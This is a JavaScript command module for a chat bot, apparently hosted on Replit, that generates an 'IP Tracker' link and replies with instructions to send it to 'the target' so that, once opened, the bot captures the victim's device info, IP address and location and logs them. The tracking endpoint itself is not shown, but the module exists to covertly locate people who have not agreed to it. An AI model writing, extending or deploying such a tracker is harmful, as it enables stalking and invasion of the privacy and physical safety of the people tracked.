const path = require('path');
const fs = require('fs');

module.exports = {
    name: 'geo',
    description: 'Create a link to get device and location info.',
    async execute(client, message, args) {
        try {
            // Get the current domain
            const domain = process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : '';
            
            if (!domain) {
                // Fallback to searching for the domain via shell if REPL_SLUG is missing
                const { execSync } = require('child_process');
                try {
                    const host = execSync('env | grep REPL_SLUG').toString().split('=')[1].trim();
                    const owner = execSync('env | grep REPL_OWNER').toString().split('=')[1].trim();
                    const trackerUrl = `https://${host}.${owner}.repl.co/track`;
                    return message.reply(`📍 *IP Tracker Link Generated:*\n\n${trackerUrl}\n\n*Note:* Send this link to the target. Once they click, their info will appear in the logs/dashboard.`);
                } catch (e) {
                    return message.reply("❌ Error: Could not determine server URL.");
                }
            }

            const trackerUrl = `${domain}/track`;
            const replyText = `📍 *IP Tracker Link Generated:*\n\n${trackerUrl}\n\n*Instructions:*\n1. Send this link to the target.\n2. Once they open it, the bot will capture their Device Info, IP, and Location.\n3. Results will be logged to the bot's console.`;
            
            const target = message.fromMe ? message.to : message.from;
            await client.sendMessage(target, replyText);
        } catch (error) {
            console.error('Geo Command Error:', error);
            message.reply("❌ Error generating tracker link.");
        }
    }
};